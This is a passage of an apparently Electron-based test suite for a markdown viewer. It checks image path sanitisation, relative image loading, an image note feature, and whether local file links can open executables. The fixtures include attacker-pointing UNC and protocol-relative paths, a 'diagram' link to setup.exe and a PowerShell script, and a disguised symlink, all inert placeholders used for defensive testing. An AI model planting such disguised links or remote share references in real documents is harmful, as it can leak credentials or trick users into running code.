      await admitTestDocument(win, filePath, markdown, { externallyManagedChooser: true });
      check("SETUP image admission consumes its exact one-use Main chooser: " + heading,
        allowance.consumed && chooserAllowance === null && securityDialogGuardsIntact());
      if (!allowance.consumed || chooserAllowance !== null || !securityDialogGuardsIntact()) {
        throw new Error("Image fixture bypassed its scoped Main chooser");
      }
    } finally {
      chooserAllowance = null;
    }
    let owner = null, ready = false;
    for (let attempt = 0; attempt < 160; attempt++) {
      owner = await readSecurityImageOwner(filePath);
      ready = securityImageOwnerMatches(owner, filePath, markdown, heading) &&
        owner.pageSession === before.pageSession &&
        fs.readFileSync(filePath, "utf8") === markdown &&
        isDeepStrictEqual(owner.images.map(image => image.alt), alts) &&
        validAlts.every(alt => owner.images.find(image => image.alt === alt)?.complete === true) &&
        (!alts.includes("missing") ||
          owner.images.find(image => image.alt === "missing")?.complete === true);
      if (ready) break;
      await sleep(50);
    }
    check("SETUP admitted image owner, disk body and current completed-image DOM agree: " + heading,
      ready, JSON.stringify(owner));
    if (!ready) throw new Error("Image fixture did not reach its current admitted DOM");
    return owner;
  }

  async function closeSecurityImageFixture(owner, filePath, markdown, heading) {
    const before = await readSecurityImageOwner(filePath);
    const clean = securityImageOwnerMatches(before, filePath, markdown, heading) &&
      before.id === owner.id && before.pageSession === owner.pageSession &&
      isDeepStrictEqual(before.identity, owner.identity) &&
      before.descriptor.ref === owner.descriptor.ref &&
      fs.readFileSync(filePath, "utf8") === markdown;
    check("SETUP only the known clean image owner exists before close: " + heading,
      clean, JSON.stringify(before));
    if (!clean) throw new Error("Refusing to close an unknown, dirty or saving image owner");
    await exec(`(() => {
      const dialogs = window.MarkalooDialogs;
      if (!dialogs || typeof dialogs.show !== 'function' ||
          document.querySelector('#appMessageDialog[open]')) {
        throw new Error('Image close starts with an unexpected application dialog');
      }
      const observation = window.__securityImageClose = {
        dialogs, confirm: window.confirm, calls: [], confirmations: [],
        opened: false, done: false, error: null,
      };
      observation.observedDialogs = Object.freeze({
        ...dialogs,
        show(...args) {
          observation.calls.push(String(args[0]?.title || 'untitled'));
          return dialogs.show(...args);
        },
      });
      window.MarkalooDialogs = observation.observedDialogs;
      window.confirm = message => {
        observation.confirmations.push(String(message));
        throw new Error('Unexpected image-close confirmation');
      };
      observation.observer = new MutationObserver(records => {
        if (document.querySelector('#appMessageDialog[open]') ||
            records.some(record => record.target.id === 'appMessageDialog' &&
              record.attributeName === 'open' && record.oldValue !== null)) {
          observation.opened = true;
        }
      });
      observation.observer.observe(document.body, {
        subtree: true, childList: true, attributes: true,
        attributeFilter: ['open'], attributeOldValue: true,
      });
      if (window.MarkalooDialogs !== observation.observedDialogs) {
        throw new Error('Image-close dialog observation was not installed');
      }
      Promise.resolve().then(() => window.CustomTabs.closeTab(${JSON.stringify(owner.id)}))
        .then(() => { observation.done = true; }, error => {
          observation.error = String(error?.stack || error);
          observation.done = true;
        });
      return true;
    })()`);
    let closed = null;
    try {
      for (let attempt = 0; attempt < 100; attempt++) {
        closed = await exec(`(() => {
          const observation = window.__securityImageClose;
          return {
            done: observation.done, error: observation.error,
            calls: observation.calls.slice(), confirmations: observation.confirmations.slice(),
            opened: observation.opened || !!document.querySelector('#appMessageDialog[open]'),
            observing: window.MarkalooDialogs === observation.observedDialogs,
          };
        })()`);
        if (!closed.observing || closed.calls.length || closed.confirmations.length ||
            closed.opened || closed.error) {
          check("image close never opens or answers an unexpected confirmation: " + heading,
            false, JSON.stringify(closed));
          throw new Error("Unexpected image-close dialog or failure; no answer was supplied");
        }
        if (closed.done) break;
        await sleep(50);
      }
      const after = await readSecurityImageOwner(filePath);
      const retired = closed?.done === true && after.tabs.length === 0 &&
        after.id === null && after.path === null && after.current === null &&
        after.descriptor === null && after.identity === null &&
        after.pending.pending === false && after.pending.count === 0 &&
        after.welcome && after.heading === "Welcome to Markaloo" && after.loading === false;
      check("the clean image owner retires without confirmation and restores welcome DOM: " + heading,
        retired, JSON.stringify({ closed, after }));
      if (!retired) throw new Error("Image owner did not retire into a real no-document state");
    } finally {
      await exec(`(() => {
        const observation = window.__securityImageClose;
        observation.observer.disconnect();
        window.MarkalooDialogs = observation.dialogs;
        window.confirm = observation.confirm;
        delete window.__securityImageClose;
        return true;
      })()`);
    }
  }

  // No document may be invented by assigning currentFilePath. The direct-render
  // hook control is valid only while the real tab model has no owner at all.
  const imageHookOwner = await readSecurityImageOwner(null);
  const noImageHookOwner = imageHookOwner.tabs.length === 0 && imageHookOwner.id === null &&
    imageHookOwner.current === null && imageHookOwner.descriptor === null &&
    imageHookOwner.identity === null && imageHookOwner.pending.pending === false &&
    imageHookOwner.pending.count === 0;
  check("SETUP local-image hook control has no admitted document or pending save",
    noImageHookOwner, JSON.stringify(imageHookOwner));
  if (!noImageHookOwner) throw new Error("Local-image hook control has an unexpected owner");
  await render(
    "# Doc\n\n" +
      "<img id=i1 src=\"C:\\pics\\a.png\">\n\n" +
      "<img id=i2 src=\"file:///C:/pics/b.png\">\n\n" +
      "<img id=i3 src=\"\\\\attacker\\share\\c.png\">\n\n" +
      "<img id=i4 src=\"file://attacker/share/d.png\">\n\n" +
      "<img id=i5 src=\"img/e.png\">\n\n" +
      "<img id=i6 src=\"//attacker/share/f.png\">\n",
    "full",
    1500,
  );
  const imgs = await exec(`
    (() => {
      const g = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('src') || '') : null;
      };
      return { i1: g('i1'), i2: g('i2'), i3: g('i3'), i4: g('i4'), i5: g('i5'), i6: g('i6') };
    })()
  `);
  check(
    "FEATURE local drive-letter and file:///<drive> image paths are preserved",
    imgs.i1 === "C:\\pics\\a.png" && imgs.i2 === "file:///C:/pics/b.png",
    JSON.stringify(imgs),
  );
  check(
    "SEC-hook UNC, protocol-relative and remote file:// image paths are stripped",
    !imgs.i3 && !imgs.i4 && !imgs.i6,
    JSON.stringify(imgs),
  );
  check(
    "FEATURE ordinary relative image paths are unaffected by the hook",
    imgs.i5 === "img/e.png",
    JSON.stringify(imgs),
  );

  // ==========================================================================
  // Document-relative image sources resolve against the file being viewed
  //
  // Relative *links* have always resolved against path.dirname(currentFilePath);
  // relative *images* did not. They resolved against document.baseURI, which is
  // index.html INSIDE THE ASAR, so `![](shots/a.png)` next to the document
  // silently never loaded - naturalWidth 0, measured on the real open path.
  //
  // The assertions below are deliberately about whether the bytes LOAD, not
  // about the shape of the src string: the whole defect was a src that looked
  // perfectly reasonable and pointed nowhere. Real PNGs are written to disk and
  // naturalWidth is the oracle.
  //
  // The encoded cases are not decoration. marked percent-encodes what it emits
  // (`shots/my pic.png` arrives as `shots/my%20pic.png`, `hash#tag.png` as
  // `hash%23tag.png`), so a resolver that joins strings produces a path with a
  // literal `%20` in it and the image stays broken. Only a URL-parser
  // resolution survives these two.
  // ==========================================================================
  const relDir = path.join(dir, "relimg");
  const relShots = path.join(relDir, "shots");
  fs.mkdirSync(relShots, { recursive: true });
  const relPng = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAJUlEQVR42u3NMQEAAAgDoC252H0M" +
      "PwjQk3aTLwoAAAAAAAAAAAAcWzQoAAG5jgSdAAAAAElFTkSuQmCC",
    "base64",
  );
  for (const n of ["a.png", "b.png", "my pic.png", "hash#tag.png", "raw.png"]) {
    fs.writeFileSync(path.join(relShots, n), relPng);
  }
  fs.writeFileSync(path.join(relDir, "sibling.png"), relPng);
  const relDoc = path.join(relDir, "doc.md");
  const relHeading = "Security admitted relative images";
  const relMarkdown = "# " + relHeading + "\n\n" +
    "![plain](shots/a.png)\n\n" +
    "![dot](./shots/b.png)\n\n" +
    "![space](<shots/my pic.png>)\n\n" +
    "![hash](shots/hash%23tag.png)\n\n" +
    "![sibling](sibling.png)\n\n" +
    "![dotdot](sub/../shots/a.png)\n\n" +
    '<img alt="rawhtml" src="shots/raw.png">\n\n' +
    "![missing](shots/nope.png)\n\n" +
    "![unc](//attacker/share/x.png)\n\n" +
    "![frag](#nope)\n\n" +
    '<img alt="abs" src="C:\\pics\\a.png">\n';
  fs.writeFileSync(relDoc, relMarkdown, "utf8");

  // VACUITY GUARD: if the fixtures are not on disk every naturalWidth below is
  // 0 for a reason that has nothing to do with the resolver, and the suite
  // would be asserting against a broken setup rather than against the product.
  check(
    "SETUP relative-image fixtures exist on disk",
    fs.existsSync(path.join(relShots, "a.png")) &&
      fs.existsSync(path.join(relShots, "my pic.png")) &&
      fs.existsSync(path.join(relShots, "hash#tag.png")) &&
      fs.existsSync(path.join(relDir, "sibling.png")),
    relDir,
  );

  const relOwner = await admitSecurityImageFixture(
    relDoc, relMarkdown, relHeading,
    ["plain", "dot", "space", "hash", "sibling", "dotdot", "rawhtml",
      "missing", "unc", "frag", "abs"],
    ["plain", "dot", "space", "hash", "sibling", "dotdot", "rawhtml"],
  );
  const rel = await exec(`
    (() => {
      const out = {};
      for (const i of document.querySelectorAll('#viewer img')) {
        out[i.getAttribute('alt') || '?'] = {
          complete: i.complete,
          w: i.naturalWidth,
          attr: i.getAttribute('src'),
          authored: i.getAttribute('data-original-src')
        };
      }
      return out;
    })()
  `);
  const relLoaded = (k) => !!(rel[k] && rel[k].w > 0);
  check(
    "FEATURE document-relative images load: markdown, ./-prefixed, sibling and raw HTML",
    relLoaded("plain") &&
      relLoaded("dot") &&
      relLoaded("sibling") &&
      relLoaded("rawhtml"),
    JSON.stringify(rel),
  );
  check(
    "FEATURE percent-encoded relative images load (spaces and #)",
    relLoaded("space") && relLoaded("hash"),
    JSON.stringify(rel),
  );
  check(
    "FEATURE a relative image traversing .. resolves to the same file",
    relLoaded("dotdot"),
    JSON.stringify(rel),
  );
  check(
    "FEATURE the authored src is preserved for the note feature",
    rel.plain &&
      rel.plain.authored === "shots/a.png" &&
      rel.dot &&
      rel.dot.authored === "./shots/b.png",
    JSON.stringify(rel),
  );
  check(
    "SEC-hook a UNC image src stays stripped even with a document path set",
    !!rel.unc && !rel.unc.attr,
    JSON.stringify(rel),
  );
  check(
    "FEATURE an absolute drive-letter src is left exactly as authored",
    !!rel.abs && rel.abs.attr === "C:\\pics\\a.png" && !rel.abs.authored,
    JSON.stringify(rel),
  );
  check(
    "FEATURE a relative image naming a missing file stays broken, not silently rewritten elsewhere",
    !!rel.missing && rel.missing.complete === true && rel.missing.w === 0 &&
      /shots\/nope\.png$/.test(rel.missing.attr || ""),
    JSON.stringify(rel),
  );
  // A fragment-only src names no image. Resolving it would write the
  // document's own absolute path into the attribute, and from there into the
  // exported PDF, for nothing.
  check(
    "FEATURE a fragment-only image src is not resolved to the document's own path",
    !!rel.frag && rel.frag.attr === "#nope" && !rel.frag.authored,
    JSON.stringify(rel),
  );

  // With no document open there is nothing to resolve against, and the src must
  // be left alone rather than resolved against the app's own directory.
  await closeSecurityImageFixture(relOwner, relDoc, relMarkdown, relHeading);
  await render("# Security no-document image control\n\n![nodoc](shots/a.png)\n", "full", 900);
  const noDoc = await exec(`
    (() => {
      const i = document.querySelector('#viewer img');
      return i ? { attr: i.getAttribute('src'), authored: i.getAttribute('data-original-src') } : null;
    })()
  `);
  const noDocOwner = await readSecurityImageOwner(null);
  check("SETUP no-document image control renders only after actual owner retirement",
    noDocOwner.tabs.length === 0 && noDocOwner.id === null &&
      noDocOwner.current === null && noDocOwner.descriptor === null &&
      noDocOwner.identity === null && noDocOwner.pending.pending === false &&
      noDocOwner.pending.count === 0 && noDocOwner.loading === false &&
      noDocOwner.heading === "Security no-document image control" &&
      noDocOwner.images.length === 1 && noDocOwner.images[0].alt === "nodoc",
    JSON.stringify(noDocOwner));
  check(
    "FEATURE with no file open a relative image src is left untouched",
    !!noDoc && noDoc.attr === "shots/a.png" && !noDoc.authored,
    JSON.stringify(noDoc),
  );

  // ==========================================================================
  // The rendered src is not the authored markdown destination
  //
  // marked normalises the destination on its way into the attribute:
  //
  //   ![a](<shots/my pic.png>)  ->  src="shots/my%20pic.png"
  //
  // so the note feature - which rebuilds `![alt](src)` and searches the raw
  // markdown for it - found nothing and reported "Could not find image in
  // source" for any path containing a space or a #. That is older than the
  // relative-path resolution above and independent of it, but it is the same
  // mistake about what the src string is, so it is fixed and pinned together.
  //
  // The image slider was the second consumer of this contract and had its own
  // assertion here until 8c2 removed the feature. The contract itself is
  // unchanged and is still measured, because the note feature exercises the
  // same helpers (markdownImageCandidates, data-original-src) end to end.
  //
  // The assertion drives the REAL context-menu handler on a REAL rendered
  // image: a contextmenu event to set the right-click target, then a click on
  // the actual menu item. Nothing is asserted about source text alone.
  // ==========================================================================
  const noteDoc = path.join(relDir, "image-note.md");
  const noteHeading = "Security admitted normalized image note";
  const normSrc = "# " + noteHeading + "\n\n![space](<shots/my pic.png>)\n";
  const noteOwner = await admitSecurityImageFixture(
    noteDoc, normSrc, noteHeading, ["space"], ["space"],
  );
  check("SETUP the separate admitted note image loads its normalized destination",
    noteDoc !== relDoc && noteOwner.images[0].width > 0 &&
      noteOwner.images[0].authored === "shots/my%20pic.png" &&
      noteOwner.images[0].src === pathToFileURL(path.join(relShots, "my pic.png")).href,
    JSON.stringify(noteOwner.images));
  if (noteOwner.images[0].width <= 0 ||
      noteOwner.images[0].authored !== "shots/my%20pic.png" ||
      noteOwner.images[0].src !== pathToFileURL(path.join(relShots, "my pic.png")).href) {
    throw new Error("The note fixture lacks its current normalized image");
  }
  await exec(`(() => {
    window.__noteFixture = {
      alerts: [], alert: window.alert,
    };
    window.alert = message => window.__noteFixture.alerts.push(String(message));
    return true;
  })()`);
  try {
    const noteAction = await exec(`
      (() => {
        const img = document.querySelector('#viewer img[alt="space"]');
        if (!img || !img.complete || img.naturalWidth <= 0 ||
            document.querySelector('#viewer h1')?.textContent !== ${JSON.stringify(noteHeading)}) {
          throw new Error('Current admitted note image is not ready');
        }
        img.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true }));
        const addNote = document.getElementById('ctxAddNote');
        if (addNote.classList.contains('disabled')) throw new Error('Image note menu is disabled');
        addNote.click();
        if (!document.getElementById('noteDialogOverlay').classList.contains('visible')) {
          throw new Error('The image context-menu did not open its real note dialog');
        }
        document.getElementById('noteTitle').value = 'a note';
        document.getElementById('noteSaveBtn').click();
        return true;
      })()
    `);
    check("SETUP the admitted image context-menu and actual note Save action run",
      noteAction === true);
    await sleep(1500);
    const noteSrc = await exec(`window.originalMarkdown`);
    check(
      "FEATURE add-note-to-image finds an image whose markdown destination marked normalised",
      typeof noteSrc === "string" &&
        noteSrc.includes("noted-image") &&
        !noteSrc.includes("![space]("),
      JSON.stringify(noteSrc),
    );
    let noteSaved = null;
    for (let i = 0; i < 100; i++) {
      const disk = fs.readFileSync(noteDoc, "utf8");
      noteSaved = await exec(`(() => {
        const tab = window.CustomTabs.getActiveTab();
        const state = tab && window.CustomTabs.__documentState(tab);
        return {
          id: tab && tab.id,
          path: tab && tab.filePath,
          content: tab && tab.content,
          original: tab && tab.originalContent,
          live: window.originalMarkdown,
          dirty: state && state.dirty,
          markedDirty: tab && tab.hasUnsavedChanges,
          pending: window.getPendingSaveStatus([${JSON.stringify(noteDoc)}]).pending,
          alerts: window.__noteFixture.alerts.slice(),
          heading: document.querySelector('#viewer h1')?.textContent,
          notedImageComplete: document.querySelector('#viewer .noted-image img[alt="space"]')?.complete,
          noteDialogClosed: !document.getElementById('noteDialogOverlay').classList.contains('visible'),
        };
      })()`);
      noteSaved.diskMatches = disk === noteSrc;
      if (noteSaved.id === noteOwner.id &&
          noteSaved.path === noteDoc &&
          noteSaved.diskMatches &&
          noteSaved.content === noteSrc &&
          noteSaved.original === noteSrc &&
          noteSaved.live === noteSrc &&
          noteSaved.dirty === false &&
          noteSaved.markedDirty === false &&
          noteSaved.pending === false &&
          noteSaved.heading === noteHeading &&
          noteSaved.notedImageComplete === true &&
          noteSaved.noteDialogClosed === true &&
          noteSaved.alerts.length === 0) break;
      if (noteSaved.alerts.length) break;
      await sleep(50);
    }
    const settled = noteSaved &&
      noteSaved.id === noteOwner.id &&
      noteSaved.path === noteDoc &&
      noteSaved.diskMatches &&
      noteSaved.content === noteSrc &&
      noteSaved.original === noteSrc &&
      noteSaved.live === noteSrc &&
      noteSaved.dirty === false &&
      noteSaved.markedDirty === false &&
      noteSaved.pending === false &&
      noteSaved.heading === noteHeading &&
      noteSaved.notedImageComplete === true &&
      noteSaved.noteDialogClosed === true &&
      noteSaved.alerts.length === 0;
    check("the note auto-save settles on its disk-backed tab", settled, JSON.stringify(noteSaved));
    if (!settled) throw new Error("Note auto-save did not settle on its clean owner");
    const savedOwner = await readSecurityImageOwner(noteDoc);
    check(
      "the note save preserves its admitted owner and normalized source destination",
      savedOwner.id === noteOwner.id &&
        savedOwner.descriptor?.ref === noteOwner.descriptor.ref &&
        isDeepStrictEqual(savedOwner.identity, noteOwner.identity) &&
        savedOwner.heading === noteHeading &&
        savedOwner.images.length === 1 && savedOwner.images[0].noted &&
        savedOwner.images[0].complete && savedOwner.images[0].width > 0 &&
        savedOwner.images[0].src === pathToFileURL(path.join(relShots, "my pic.png")).href &&
        /<img src="shots\/my%20pic\.png" alt="space">/.test(noteSrc) &&
        fs.readFileSync(relDoc, "utf8") === relMarkdown,
      JSON.stringify({ savedOwner, noteSrc }),
    );
    await closeSecurityImageFixture(noteOwner, noteDoc, noteSrc, noteHeading);
  } finally {
    await exec(`(() => {
      window.alert = window.__noteFixture.alert;
      delete window.__noteFixture;
      return true;
    })()`);
  }

  // ==========================================================================
  // SEC-12 - a link to a local file was handed straight to shell.openPath()
  //
  // The threat model is a markdown document that arrives with sibling files
  // under the same author's control (a cloned repo, an unpacked archive, a
  // shared folder). hrefs resolve relative to the document's own directory, so
  // "[architecture diagram](./setup.exe)" was one click away from executing an
  // attacker-supplied binary through the system shell - with no prompt, and no
  // indication in the link text that anything but a diagram would open.
  //
  // Local rows use admitted immutable sources and trusted pointer input through
  // the unchanged isolated preload. Main policy, real-target classification and
  // owned consent remain real; only the shared OS-opening trap records handoff.
  // N11's legacy recovery dependency below is retained, NOT initialized here.
  // Its actual-Main reload/restore/admission repair remains separately pending.
  // ==========================================================================
  const s12dir = path.join(dir, "sec12");
  fs.mkdirSync(s12dir, { recursive: true });
  for (const f of [
    "setup.exe",
    "script.ps1",
    "report.docm",
    "notes.txt",
    "diagram.svg",
    "linked.md",
  ]) {
    fs.writeFileSync(path.join(s12dir, f), "placeholder");
  }
  const s12doc = path.join(s12dir, "doc.md");
  fs.writeFileSync(s12doc, [
    "# Local links", "", "[exe](./setup.exe)", "", "[ps1](./script.ps1)", "",
    "[docm](./report.docm)", "", "[txt](./notes.txt)", "", "[svg](./diagram.svg)", "",
    "[md](./linked.md)", "", "[unc](//attacker.invalid/share/payload.txt)", "",
  ].join("\n"));

  {
    function securityLocalProjection(event, data, contents, frame) {
      return {
        kind: data?.kind, href: data?.href, documentRef: data?.documentRef,
        owner: event.sender === contents, frame: event.senderFrame === frame &&
          event.senderFrame === contents.mainFrame,
        windowId: BrowserWindow.fromWebContents(event.sender)?.id ?? null,
        frameId: event.senderFrame?.frameTreeNodeId ?? null,
      };
    }

    function securityLocalSlice(records, start) {
      if (!Number.isSafeInteger(start) || start < 0 || start > records.length) {
        throw new Error("Local observation history was truncated or has an invalid mark");
      }
      return records.slice(start);
    }

    function securityLocalSeal(before, validated) {
      // Only the slices adjudicated for this case may advance its endpoints.
      // A fresh count after an await can silently adopt an unvalidated late open.
      return Object.freeze({
        shell: before.shell + validated.shell.length,
        external: before.external + validated.external.length,
        sends: before.sends + validated.sends.length,
        entries: before.entries + validated.entries.length,
        work: before.work + validated.work.length,
        navigation: before.navigation + validated.navigation.length,
        clicks: before.clicks + validated.clicks.length,
        errors: before.errors + validated.errors.length,
        faults: before.faults + validated.faults.length,
      });
    }

    function restoreSecurityLocalSlot(object, key, installed, original, descriptor) {
      if (object[key] !== installed) throw new Error("Local observation lost ownership: " + key);
      if (descriptor) Object.defineProperty(object, key, descriptor);
      else delete object[key];
      if (object[key] !== original ||
          !isDeepStrictEqual(Object.getOwnPropertyDescriptor(object, key), descriptor)) {
        throw new Error("Local observation did not restore: " + key);
      }
    }

    function securityLocalTargetMatches(target, retained, source, sourcePath, sourceBody,
      targetPath, targetBody, targetHeading) {
      const descriptor = target.descriptor, identity = target.identity;
      return Number.isSafeInteger(target.id) && target.id > 0 && target.id !== source.id &&
        target.tabs.length === 2 &&
        target.tabs.filter(tab => tab.id === source.id && tab.path === sourcePath).length === 1 &&
        target.tabs.filter(tab => tab.id === target.id && tab.path === targetPath).length === 1 &&
        target.path === targetPath && target.current === targetPath &&
        target.content === targetBody && target.original === targetBody && target.live === targetBody &&
        descriptor?.logicalPath === targetPath &&
        descriptor.documentUrl === pathToFileURL(targetPath).href &&
        typeof descriptor.ref === "string" && /^[a-f0-9]{64}$/.test(descriptor.ref) &&
        descriptor.ref !== source.descriptor.ref &&
        identity?.tabId === target.id && identity.documentRef === descriptor.ref &&
        target.pageSession === source.pageSession && identity.pageSession === source.pageSession &&
        identity.rendererGeneration === source.identity.rendererGeneration &&
        Number.isSafeInteger(identity.documentGeneration) && identity.documentGeneration > 0 &&
        typeof identity.pathKey === "string" && identity.pathKey.length > 0 &&
        identity.pathKey !== source.identity.pathKey &&
        target.state?.maintained === true && target.state.dirty === false &&
        target.state.liveWitnessMatchesContent === true && target.markedDirty === false &&
        target.pending.pending === false && target.pending.count === 0 &&
        target.heading === targetHeading && target.loading === false && !target.welcome &&
        target.images.length === 0 && retained?.id === source.id && retained.path === sourcePath &&
        retained.content === sourceBody && retained.original === sourceBody &&
        retained.markedDirty === false && retained.state?.maintained === true &&
        retained.state.dirty === false && retained.state.liveWitnessMatchesContent === true &&
        isDeepStrictEqual(retained.descriptor, source.descriptor) &&
        isDeepStrictEqual(retained.identity, source.identity);
    }

    const contents = win.webContents, frame = contents.mainFrame, pageUrl = contents.getURL();
    const registration = { handler: securityGestureRegistration.handler,
      installed: securityGestureRegistration.installed };
    if (securityGestureRegistration.count !== 1 || typeof registration.handler !== "function" ||
        typeof registration.installed !== "function" || securityGestureRegistration.observer !== null ||
        expectedSecurityQuestion !== null || !securityDialogGuardsIntact() ||
        !await waitForExternalTrap(win)) {
      throw new Error("SEC-12 requires the captured actual Main handler and intact guards");
    }
    const realSend = contents.send, realPathHost = fs.realpathSync;
    const realPath = realPathHost.native, realStat = fs.statSync;
    const sharedTrapShell = require("electron").shell;
    const trapOpeners = Object.freeze({
      openPath: sharedTrapShell.openPath, openExternal: sharedTrapShell.openExternal,
    });
    const originalSlots = {
      observer: Object.getOwnPropertyDescriptor(securityGestureRegistration, "observer"),
      send: Object.getOwnPropertyDescriptor(contents, "send"),
      realPath: Object.getOwnPropertyDescriptor(realPathHost, "native"),
      stat: Object.getOwnPropertyDescriptor(fs, "statSync"),
    };
    const linkedPath = path.join(s12dir, "linked.md");
    const linkedBody = "# Security linked target\n\nSEC12_ACTUAL_LINKED_DISK_BODY\n";
    fs.writeFileSync(linkedPath, linkedBody, "utf8");
    const localBody = fs.readFileSync(s12doc, "utf8");
    const resolutionPath = path.join(s12dir, "resolution.md");
    const resolutionBody = "# Resolution\n\n[symlink](./diagram-link.png)\n\n[folder](./subfolder)\n";
    const extPath = path.join(s12dir, "ext.md");
    const extBody = "# Ext\n\n[license](./LICENSE)\n";
    fs.writeFileSync(resolutionPath, resolutionBody, "utf8");
    fs.writeFileSync(extPath, extBody, "utf8");
    const licensePath = path.join(s12dir, "LICENSE");
    fs.writeFileSync(licensePath, "MIT\n", { encoding: "utf8", mode: 0o644 });
    const licenseStats = realStat(licensePath);
    const inertLicense = licenseStats.isFile() && fs.readFileSync(licensePath, "utf8") === "MIT\n" &&
      (process.platform === "win32" || (licenseStats.mode & 0o111) === 0);
    check("SETUP SEC-12 LICENSE is an actual non-executable regular MIT file", inertLicense);
    if (!inertLicense) throw new Error("Extensionless fixture is not the intended inert regular file");
    const s12link = path.join(s12dir, "diagram-link.png");
    let symlinksAvailable = true;
    try { fs.symlinkSync(path.join(s12dir, "script.ps1"), s12link, "file"); }
    catch (e) {
      // Windows needs Developer Mode or SeCreateSymbolicLinkPrivilege.
      symlinksAvailable = false;
      console.log(
        `SKIP  SEC-12 symlink coverage - cannot create a symlink here (${e.code || e.message})`,
      );
      skipped.push("SEC-12 symlink");
    }
    const s12subdir = path.join(s12dir, "subfolder");
    fs.mkdirSync(s12subdir, { recursive: true });
    const targets = new Map();
    for (const name of ["setup.exe", "script.ps1", "report.docm", "notes.txt",
      "diagram.svg", "linked.md", "subfolder", "LICENSE",
      ...(symlinksAvailable ? ["diagram-link.png"] : [])]) {
      const logical = path.join(s12dir, name);
      targets.set(name, { logical, real: realPath(logical) });
    }
    if (symlinksAvailable) {
      const actualSymlink = fs.lstatSync(s12link).isSymbolicLink() &&
        targets.get("diagram-link.png").real === targets.get("script.ps1").real;
      check("SETUP SEC-12 the real safe-looking symlink resolves to the actual PowerShell fixture",
        actualSymlink);
      if (!actualSymlink) throw new Error("SEC-12 symlink setup did not establish its actual script target");
    }
    const sends = [], fileWork = [], entries = [], navigation = [], actions = [], faults = [];
    let activeAction = null, source = null, sourcePath = null, sourceBody = null, sourceHeading = null;
    let sealed = null, pageInstalled = false;
    const knownOwners = new Map();
    let localFailure = null;
    const networkTarget = value => /^(\\\\|\/\/)/.test(value) || /attacker\.invalid/i.test(value);
    const observer = {
      enter(event, data) {
        const record = securityLocalProjection(event, data, contents, frame);
        entries.push(record);
        const action = activeAction;
        if (!action || !action.pending || action.settled || ++action.entries !== 1 ||
            !record.owner || !record.frame || record.windowId !== win.id ||
            record.kind !== "link" || record.href !== action.href ||
            record.documentRef !== action.source.descriptor.ref) {
          faults.push("Unexpected or stale actual Main gesture entry");
          throw new Error(faults.at(-1));
        }
        action.entry = record;
        return { record, action };
      },
      finish(observation, reply, error) {
        const action = observation?.action;
        if (!action || activeAction !== action || action.settled) {
          faults.push("Actual Main gesture settlement lost its local owner");
          return;
        }
        action.result = reply;
        action.error = error ? String(error.message || error) : null;
        action.settled = true;
      },
    };
    const observedSend = function(channel, value) {
      if (channel === "external-file-open-request" || channel === "show-error") {
        const action = activeAction;
        sends.push({ action: action?.id ?? null, channel,
          ...(channel === "show-error" ? { message: value } : { path: value?.filePath }) });
        if (!action?.pending) faults.push("Unattributed late Main link delivery");
      }
      return realSend.apply(this, arguments);
    };
    function observeSecurityLocalFS(kind, original, receiver, args) {
      const file = String(args[0]), action = activeAction;
      const forbidden = networkTarget(file);
      const relevant = action?.entry && action.pending && !action.settled &&
        (forbidden || file === action.target?.logical || file === action.target?.real);
      const record = forbidden || relevant ? {
        action: action?.id ?? null, kind, file, forbidden, terminal: false,
      } : null;
      if (record) fileWork.push(record);
      if (forbidden) {
        // Recording precedes the safety stop. This is a FAILED product-policy
        // observation, never evidence that Main itself blocked network I/O.
        faults.push("Main attempted forbidden remote filesystem work: " + kind);
        check("SEC-12 Main never attempts forbidden remote filesystem work",
          false, JSON.stringify(record));
        throw new Error("Test safety stop after forbidden remote filesystem attempt");
      }
      try {
        const result = original.apply(receiver, args);
        if (record) Object.assign(record, kind === "realpath" ? { resolved: result } :
          { regular: result.isFile(), directory: result.isDirectory(), mode: result.mode });
        return result;
      } catch (error) {
        if (record) record.error = String(error.message || error);
        throw error;
      } finally { if (record) record.terminal = true; }
    }
    const observedRealPath = function() {
      return observeSecurityLocalFS("realpath", realPath, this, arguments);
    };
    const observedStat = function() {
      return observeSecurityLocalFS("stat", realStat, this, arguments);
    };
    const observeFrameNavigation = (_event, details) => {
      if (details.isMainFrame) navigation.push({ kind: "will-frame-navigate", url: details.url });
    };
    const observeNavigation = (_event, url) => navigation.push({ kind: "will-navigate", url });
    const observeStartedNavigation = (_event, url, _inPlace, isMainFrame) => {
      if (isMainFrame) navigation.push({ kind: "did-start-navigation", url });
    };
    const samePage = () => !win.isDestroyed() && !contents.isDestroyed() &&
      win.webContents === contents && contents.mainFrame === frame && !frame.isDestroyed() &&
      contents.getURL() === pageUrl && frame.url === pageUrl;
    async function readPage() {
      if (!samePage()) throw new Error("SEC-12 lost its actual source page; no recovery was attempted");
      return exec(`(() => {
        const probe = window.__securityLocalLinks;
        if (!probe || probe.tabs !== window.CustomTabs || probe.folia !== window.folia ||
            probe.pageSession !== window.getReloadRequestSession()) {
          throw new Error('Local link page observation lost ownership');
        }
        return {
          clicks: probe.clicks.map(item => ({
            href: item.href, text: item.text, selected: item.selected,
            trusted: item.event.isTrusted, canceled: item.event.defaultPrevented,
          })),
          errors: probe.errors.slice(), close: !!window.__securityLocalTargetClose,
          notification: (() => {
            const toast = document.getElementById('notificationToast');
            return { text: document.getElementById('notificationMessage')?.textContent,
              visible: !!toast && toast.classList.contains('show') &&
                toast.getClientRects().length > 0 && getComputedStyle(toast).visibility !== 'hidden' &&
                Number(getComputedStyle(toast).opacity) > 0 };
          })(),
        };
      })()`);
    }
    async function pageBarrier() {
      if (!samePage()) throw new Error("Cannot drain a replaced SEC-12 source page");
      await exec(`new Promise(resolve => requestAnimationFrame(() =>
        requestAnimationFrame(() => resolve(true))))`);
      // A real public round-trip drains earlier Main deliveries without exposing
      // or synthesizing any private request.
      await exec("window.folia.getVersion()");
    }
    async function counts() {
      const page = await readPage();
      return { shell: (await visualUtils.readShellOpens(win)).length,
        external: (await visualUtils.readExternalOpens(win)).length,
        sends: sends.length, entries: entries.length, work: fileWork.length,
        navigation: navigation.length, clicks: page.clicks.length, errors: page.errors.length,
        faults: faults.length };
    }
    async function assertNoLate() {
      if (!sealed) return;
      await pageBarrier();
      const trapReady = await waitForExternalTrap(win);
      const now = await counts();
      if (!isDeepStrictEqual(now, sealed) || faults.length || navigation.length ||
          expectedSecurityQuestion !== null || !securityDialogGuardsIntact() ||
          !trapReady) {
